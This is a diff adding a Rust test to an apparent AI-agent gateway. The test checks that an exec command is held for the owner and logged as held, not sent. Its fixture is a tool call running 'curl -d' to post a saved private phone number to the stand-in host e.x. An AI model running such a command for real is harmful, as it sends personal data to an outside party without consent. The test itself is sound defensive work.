@@ -5725,3 +5725,32 @@ async fn forgetting_a_target_answers_on_one_line() {
     );
     gw.shutdown().await;
 }
+
+/// PR #39 review: an `exec` the gate held never left, and `/activity out` never says it did.
+#[tokio::test]
+async fn a_held_exec_reads_held_not_sent() {
+    let home = home("activity-held-exec");
+    let gw = start(config(&home));
+    let saw = |what: &str| gw.replies().iter().any(|r| r.contains(what));
+    gw.say(
+        "m1",
+        "owner",
+        r#"[call gateway {"command": "/facts add phone digits 5550102345"}] note it"#,
+    )
+    .await;
+    wait(|| saw("gateway: saved the private fact phone")).await;
+    gw.say(
+        "m2",
+        "owner",
+        r#"[call exec {"command": "curl -d 5550102345 https://e.x"}] send it"#,
+    )
+    .await;
+    wait(|| saw("exec: held for the owner as #")).await;
+    gw.say("m3", "owner", "/activity out").await;
+    wait(|| saw("[zephyr] outbound commands")).await;
+    let reply = (gw.replies().into_iter())
+        .find(|r| r.starts_with("[zephyr] outbound commands"))
+        .unwrap();
+    assert!(reply.ends_with("out main held: curl POST e.x"), "{reply}");
+    gw.shutdown().await;
+}
